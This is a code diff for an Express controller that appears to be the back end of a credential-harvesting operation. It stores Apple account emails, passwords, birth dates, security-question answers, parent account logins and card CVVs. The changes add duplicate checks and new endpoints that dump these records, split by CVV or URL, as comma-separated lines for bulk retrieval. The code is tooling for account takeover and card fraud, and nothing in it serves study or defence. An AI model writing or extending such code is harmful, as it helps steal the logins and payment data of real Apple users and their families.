@@ -12,7 +12,7 @@ var __importDefault = (this && this.__importDefault) || function (mod) {
     return (mod && mod.__esModule) ? mod : { "default": mod };
 };
 Object.defineProperty(exports, "__esModule", { value: true });
-exports.getAccountsWithParent = exports.getErrors = exports.getParents = exports.getUnknowns = exports.getAccounts = exports.addAccountWithParent = exports.addError = exports.addParent = exports.addUnknown = exports.addAccount = void 0;
+exports.getAccountsWithParent = exports.getErrors = exports.getParentsUrl = exports.getParentsCvv = exports.getUnknowns = exports.getAccounts = exports.addAccountWithParent = exports.addError = exports.addParent = exports.addUnknown = exports.addAccount = void 0;
 const unknownModel_1 = __importDefault(require("../models/unknownModel"));
 const appleAccountModel_1 = __importDefault(require("../models/appleAccountModel"));
 const accountWithParentModel_1 = __importDefault(require("../models/accountWithParentModel"));
@@ -23,6 +23,13 @@ const addAccount = (req, res) => __awaiter(void 0, void 0, void 0, function* () 
         const account = req.body;
         if (Object.keys(account).length === 0) {
             res.status(400).send("Invalid request");
+            return;
+        }
+        const existingAccount = yield appleAccountModel_1.default.findOne({
+            email: account.email,
+        });
+        if (existingAccount) {
+            res.status(201).send("Account already exists");
             return;
         }
         yield appleAccountModel_1.default.create(account);
@@ -55,6 +62,11 @@ const addParent = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
         const parent = req.body;
         if (Object.keys(parent).length === 0) {
             res.status(400).send("Invalid request");
+            return;
+        }
+        const existingParent = yield parentModel_1.default.findOne({ email: parent.email });
+        if (existingParent) {
+            res.status(201).send("Parent already exists");
             return;
         }
         yield parentModel_1.default.create(parent);
@@ -115,7 +127,9 @@ const getUnknowns = (req, res) => __awaiter(void 0, void 0, void 0, function* ()
     try {
         const accounts = yield unknownModel_1.default.find();
         const accountText = accounts
-            .map(({ email, password, date, first_q, second_q, third_q, first_name, last_name, parent_email, parent_password, parent_date, parent_first_q, parent_second_q, parent_third_q, cvv, }) => `${email},${password},${date},${first_q},${second_q},${third_q},${first_name},${last_name},${parent_email},${parent_password},${parent_date},${parent_first_q},${parent_second_q},${parent_third_q},${cvv}`)
+            .map(({ email, password, date, first_q, second_q, third_q, first_name, last_name, parent_email, parent_password, parent_date, parent_first_q, parent_second_q, parent_third_q, cvv, url, }) => cvv
+            ? `${email},${password},${date},${first_q},${second_q},${third_q},${first_name},${last_name},${parent_email},${parent_password},${parent_date},${parent_first_q},${parent_second_q},${parent_third_q},${cvv}`
+            : `${email},${password},${date},${first_q},${second_q},${third_q},${first_name},${last_name},${parent_email},${parent_password},${parent_date},${parent_first_q},${parent_second_q},${parent_third_q},${url}`)
             .join("<br />");
         res.status(200).send(`<p>${accountText}</p>`);
     }
@@ -124,10 +138,11 @@ const getUnknowns = (req, res) => __awaiter(void 0, void 0, void 0, function* ()
     }
 });
 exports.getUnknowns = getUnknowns;
-const getParents = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
+const getParentsCvv = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
     try {
         const parents = yield parentModel_1.default.find();
         const parentText = parents
+            .filter((parent) => parent.cvv)
             .map(({ email, password, date, first_q, second_q, third_q, cvv, stop_sharing, no_of_family, }) => `${email},${password},${date},${first_q},${second_q},${third_q},${cvv},${stop_sharing},${no_of_family}`)
             .join("<br />");
         res.status(200).send(`<p>${parentText}</p>`);
@@ -136,12 +151,28 @@ const getParents = (req, res) => __awaiter(void 0, void 0, void 0, function* () 
         res.status(500).send("Something went wrong getting the parents");
     }
 });
-exports.getParents = getParents;
+exports.getParentsCvv = getParentsCvv;
+const getParentsUrl = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
+    try {
+        const parents = yield parentModel_1.default.find();
+        const parentText = parents
+            .filter((parent) => parent.url)
+            .map(({ email, password, date, first_q, second_q, third_q, no, url, stop_sharing, no_of_family, }) => `${email},${password},${date},${first_q},${second_q},${third_q},${no},${url},${stop_sharing},${no_of_family}`)
+            .join("<br />");
+        res.status(200).send(`<p>${parentText}</p>`);
+    }
+    catch (error) {
+        res.status(500).send("Something went wrong getting the parents");
+    }
+});
+exports.getParentsUrl = getParentsUrl;
 const getErrors = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
     try {
         const parents = yield errorModel_1.default.find();
         const parentText = parents
-            .map(({ email, password, date, first_q, second_q, third_q, cvv, stop_sharing, no_of_family, }) => `${email},${password},${date},${first_q},${second_q},${third_q},${cvv},${stop_sharing},${no_of_family}`)
+            .map(({ email, password, date, first_q, second_q, third_q, cvv, no, url, stop_sharing, no_of_family, }) => cvv
+            ? `${email},${password},${date},${first_q},${second_q},${third_q},${cvv},${stop_sharing},${no_of_family}`
+            : `${email},${password},${date},${first_q},${second_q},${third_q},${no},${url},${stop_sharing},${no_of_family}`)
             .join("<br />");
         res.status(200).send(`<p>${parentText}</p>`);
     }
